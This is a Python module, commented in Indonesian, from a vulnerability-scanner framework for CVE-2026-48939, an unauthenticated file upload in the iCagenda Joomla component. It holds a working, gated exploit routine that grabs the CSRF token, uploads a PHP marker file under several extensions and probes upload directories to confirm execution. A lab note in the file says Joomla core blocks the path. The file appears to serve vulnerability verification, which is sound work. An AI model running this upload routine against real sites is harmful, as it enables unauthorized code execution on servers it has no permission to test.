#!/usr/bin/env python3
# -*- coding: utf-8 -*-
""""
Joomla! Extension — modul MEGAPACK (klaster joomla_ext).

CVE-2026-48939 — iCagenda <= 4.0.7 — Unauthenticated arbitrary file upload to
RCE lewat `task=submit.submit` (field `jform[file]` pada form submit front-end).

ROOT CAUSE:
    Form submit front-end menerima unggahan `jform[file]` dan menyimpannya ke
    `images/icagenda/frontend/attachments/` tanpa memeriksa otorisasi, tanpa
    allow-list ekstensi yang ketat, dan tanpa menonaktifkan eksekusi di direktori
    tujuan. Penyerang tanpa login dapat mengunggah berkas PHP yang dapat
    dipanggil lewat URL langsung.

DETEKSI (check) — NON-DESTRUKTIF:
    Tidak ada berkas yang diunggah. Modul hanya:
      1) memastikan komponen terpasang
      2) mengambil halaman submit + token CSRF/catid/itemid
      3) mengirim `submit.submit` TANPA field `jform[file]`
    Handler yang berjalan (bukan 403/penolakan izin) menandakan gate otorisasi
    tidak ada.

EKSPLOIT (exploit) — gated:
    Mengunggah berkas PHP lalu memverifikasi bahwa berkas itu benar-benar
    DIEKSEKUSI (marker pada respons), bukan sekadar tersimpan.
"""
from __future__ import annotations

import re

from mp import (CveModule, ST_CLEAN, ST_INFO, ST_PWN, ST_SKIP, detect_platform,
                register, ver_le)

DETECT_PATHS = [
    "/components/com_icagenda/com_icagenda.php",
    "/administrator/components/com_icagenda/icagenda.php",
    "/media/com_icagenda/",
]

SUBMIT_URL = "/index.php?option=com_icagenda&view=submit"
POST_URL = "/index.php?option=com_icagenda&task=submit.submit&Itemid=101"

SHELL_DIRS = [
    "images/icagenda/frontend/attachments/",
    "images/icagenda/",
    "media/com_icagenda/",
    "images/",
    "media/",
]

MARK = "MP48939SHELL"
SHELL_PHP = "<?php echo '" + MARK + "'; ?>"

VULN_MAX = (4, 0, 7)
MANIFESTS = [
    "/administrator/components/com_icagenda/icagenda.xml",
    "/modules/mod_icagenda_calendar/mod_icagenda_calendar.xml",
]


def _icagenda_version(t, h):
    """Versi iCagenda = TERTINGGI dari manifest XML publik (tanpa POST/auth).

    Kenapa tertinggi: manifest komponen dapat tertinggal setelah upgrade
    (terukur di lab: target dengan modul 4.0.14 masih menyajikan
    com_icagenda.xml berisi 4.0.7). Memakai manifest pertama membuat target
    terpatch dilaporkan rentan. Versi tertinggi = versi kode terbaru yang
    benar-benar terpasang.
    """
    best = None
    for p in MANIFESTS:
        r = h.get(f"{t.url}{p}")
        if r is None or r.status_code != 200:
            continue
        m = re.search(r"<version>\s*([0-9][0-9.]*)", r.text or "")
        if not m:
            continue
        try:
            v = tuple(int(x) for x in m.group(1).split(".")[:3])
        except ValueError:
            continue
        if best is None or v > best:
            best = v
    return best


def _detect(t, h):
    for p in DETECT_PATHS:
        r = h.get(f"{t.url}{p}")
        if r is not None and r.status_code in (200, 403):
            return True, p
    r = h.get(t.url)
    if r is not None and "com_icagenda" in (r.text or "").lower():
        return True, "/ (markup)"
    return False, ""


def _parse_submit(text):
    """Ambil (csrf, catid, itemid) dari halaman submit."""
    csrf = None
    for rx in (r'name="([a-f0-9]{32})"\s+value="1"',
               r'value="1"\s+name="([a-f0-9]{32})"',
               r'"csrf\.token"\s*:\s*"([a-f0-9]{32})"'):
        m = re.search(rx, text or "")
        if m:
            csrf = m.group(1)
            break
    catid = "1"
    sel = re.search(r'<select[^>]*name="jform\[catid\]"[^>]*>(.*?)</select>',
                    text or "", re.S | re.I)
    if sel:
        for v in re.findall(r'<option[^>]*value="([^"]*)"', sel.group(1)):
            if v.strip():
                catid = v
                break
    itemid = "101"
    im = re.search(r'name="jform\[itemid\]"[^>]*value="([^"]*)"', text or "", re.I)
    if im:
        itemid = im.group(1)
    return csrf, catid, itemid


def _submit_form(t, h, csrf, catid, itemid, with_file=None):
    """Kirim submit.submit. with_file=None -> tanpa berkas (oracle)."""
    data = {
        "jform[title]": "mp-probe",
        "jform[startdate]": "2026-06-23 11:22:32",
        "jform[enddate]": "2026-06-24 11:22:34",
        "jform[shortdesc]": "mp",
        "jform[desc]": "<p>mp</p>",
        "jform[params][statutReg]": "1",
        "jform[consent][consent_tos]": "tos",
        "jform[itemid]": itemid,
        "jform[itemid_title]": "Home",
        "option": "com_icagenda",
        "task": "submit.submit",
        "jform[catid]": catid,
        "jform[username]": "guest",
        "jform[created_by_email]": "guest@example.com",
    }
    if csrf:
        data[csrf] = "1"
    files = None
    if with_file:
        files = {
            "jform[image]": ("", b"", "application/octet-stream"),
            "jform[file]": (with_file[0], with_file[1], "application/x-php"),
        }
    headers = {"Origin": t.url, "Referer": f"{t.url}{SUBMIT_URL}"}
    return h.post(f"{t.url}{POST_URL}", data=data, files=files, headers=headers)


def check(t, h, opts):
    """NON-DESTRUKTIF (revisi 2026-11-09): GET saja, tanpa POST tulis.

    Bug lama: check() mem-POST submit.submit dengan data form LENGKAP untuk
    "membuktikan handler jalan". Di lab itu MENULIS baris baru ke
    #__icagenda_events (terukur +1 baris per scan) — melanggar kontrak
    non-destruktif. Sekarang: versi dari manifest XML publik + GET halaman
    submit (tidak ada POST yang berpotensi menulis).
    """
    if detect_platform(t, h) != "joomla":
        return ST_SKIP, "bukan Joomla", ""
    found, trace = _detect(t, h)
    if not found:
        return ST_CLEAN, "iCagenda tidak terdeteksi", ""

    ver = _icagenda_version(t, h)
    r1 = h.get(f"{t.url}{SUBMIT_URL}")
    sc1 = getattr(r1, "status_code", "ERR")
    form_open = (r1 is not None and sc1 == 200
                 and "jform[file]" in (r1.text or ""))
    vs = ".".join(map(str, ver)) if ver else "tidak terbaca"
    detail = (f"detect={trace} versi={vs} form_submit_terbuka={form_open} http={sc1}")

    if sc1 in (403, 401):
        return ST_CLEAN, "halaman submit iCagenda menolak tanpa otorisasi", detail
    if ver is None:
        return (ST_INFO,
                "iCagenda terpasang; versi manifest tidak terbaca "
                "(verdict butuh --exploit)", detail)
    if ver_le(ver, VULN_MAX):
        return (ST_INFO,
                f"iCagenda {vs} (<= {'.'.join(map(str, VULN_MAX))}) — form submit "
                f"front-end terbuka tanpa login, tetapi unggah->RCE DIBLOKIR "
                f"InputFilter::isSafeFile() Joomla core (lihat notes); verdict "
                f"unggah butuh --exploit", detail)
    return (ST_CLEAN, f"iCagenda {vs} — >= 4.0.8 (canUpload ditambahkan)", detail)


def exploit(t, h, opts):
    """Gated --exploit: unggah shell + verifikasi EKSEKUSI."""
    if detect_platform(t, h) != "joomla":
        return ST_SKIP, "bukan Joomla", ""
    found, trace = _detect(t, h)
    if not found:
        return ST_SKIP, "iCagenda tidak terdeteksi", ""

    r1 = h.get(f"{t.url}{SUBMIT_URL}")
    if r1 is None or r1.status_code != 200:
        return ST_SKIP, "halaman submit tidak dapat dibuka", ""
    csrf, catid, itemid = _parse_submit(r1.text)
    if not csrf:
        return ST_INFO, "CSRF token tidak ditemukan; exploit dilewati", f"detect={trace}"

    for ext in ("php", "phtml", "php5"):
        name = f"mp48939{abs(hash(t.url)) % 100000}.{ext}"
        r2 = _submit_form(t, h, csrf, catid, itemid, with_file=(name, SHELL_PHP))
        if r2 is None:
            continue
        sc = r2.status_code
        loc = r2.headers.get("Location", "") if hasattr(r2, "headers") else ""
        if not (sc in (200, 201, 302, 303) or "submitted" in loc):
            continue
        for d in SHELL_DIRS:
            url = f"{t.url}/{d}{name}"
            v = h.get(url)
            if v is None or v.status_code != 200:
                continue
            if MARK in (v.text or ""):
                return (ST_PWN,
                        "RCE TERVERIFIKASI — iCagenda unauth upload + eksekusi PHP",
                        f"{url} memuat marker {MARK}")
            return (ST_INFO, "berkas terunggah tetapi tidak dieksekusi PHP",
                    f"{url} -> HTTP 200 tanpa marker")
    return (ST_CLEAN, "semua percobaan upload ditolak", f"detect={trace}")


register(CveModule(
    cve="CVE-2026-48939",
    cluster="joomla_ext",
    title="Joomla Ext - iCagenda unauth file upload via submit.submit",
    vclass="rce",
    cwe="CWE-434",
    product="iCagenda (com_icagenda)",
    versions_affected="<= 4.0.7",
    status="documented",
    requires=["komponen com_icagenda terpasang",
              "halaman submit front-end dapat dibuka"],
    check=check,
    exploit=exploit,
    notes=("Form submit front-end menerima `jform[file]` dan meneruskannya ke "
           "frontendFileUpload() TANPA cek otorisasi komponen. NAMUN berkas "
           "diambil via $app->input->files->get('jform') (Joomla\\CMS\\Input\\"
           "Files) yang memanggil InputFilter::isSafeFile() dan "
           "MENGEMBALIKAN null bila tidak aman. VERDICT LAB: unggah->RCE "
           "DIBLOKIR DI CORE Joomla 4.1-5.4, bukan oleh konfigurasi iCagenda. "
           "isSafeFile() menolak (a) ekstensi di FORBIDDEN_FILE_EXTENSIONS "
           "(asp/php/phtml/phar/inc/pl/cgi/jsp/py/shtml/shtm/...), dan (b) isi "
           "berkas yang memuat `<?php`. Matriks uji (lab iCagenda 4.0.7 / "
           "Joomla 5.4.8): e2.txt/<?php->null, e3.txt/<?=->null, "
           "e5.phtml/plain->null, e6.txt/plain->lolos, e4.jpg/<?=->lolos. Tak "
           "ada nama berkas yang lolos filter sekaligus dieksekusi Apache "
           "(`FilesMatch \\.php$`). canUpload() (>=4.0.8) adalah defense-in-"
           "depth di atasnya. check() NON-DESTRUKTIF: submit.submit TANPA "
           "jform[file]; exploit() mencoba unggah + verifikasi EKSEKUSI. "
           "STATUS: documented (tidak dapat diverifikasi sebagai RCE pada "
           "versi tersedia). Bukti: notes/CVE-2026-48909-48939-56290-lab-verdict.md."),
))
